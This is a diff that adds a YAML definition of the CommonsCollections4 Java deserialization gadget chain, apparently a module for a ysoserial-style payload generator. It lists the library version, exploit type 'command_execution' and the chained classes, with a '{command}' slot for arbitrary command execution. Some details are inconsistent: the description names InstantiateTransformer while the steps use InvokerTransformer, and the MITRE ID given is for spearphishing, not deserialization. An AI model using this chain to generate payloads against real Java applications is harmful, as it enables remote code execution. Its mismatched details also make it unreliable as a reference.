@@ -1,0 +1,24 @@
+name: "CommonsCollections4"
+category: "commons_collections"
+description: "CommonsCollections4 gadget chain using TemplatesImpl and InstantiateTransformer (CC4)"
+jdk_version: "all"
+dependencies:
+  - name: "commons-collections4"
+    version: "4.0"
+exploit_type: "command_execution"
+payload_type: "command"
+risk_level: 5
+mitre_technique: "T1566.001"
+references:
+  - "https://github.com/frohoff/ysoserial"
+steps:
+  - class_name: "org.apache.commons.collections4.functors.InvokerTransformer"
+    method_name: "transform"
+    parameters: []
+  - class_name: "com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl"
+    method_name: "newTransformer"
+    parameters:
+      - "{command}"
+  - class_name: "org.apache.commons.collections4.comparators.TransformingComparator"
+    method_name: "compare"
+    parameters: []
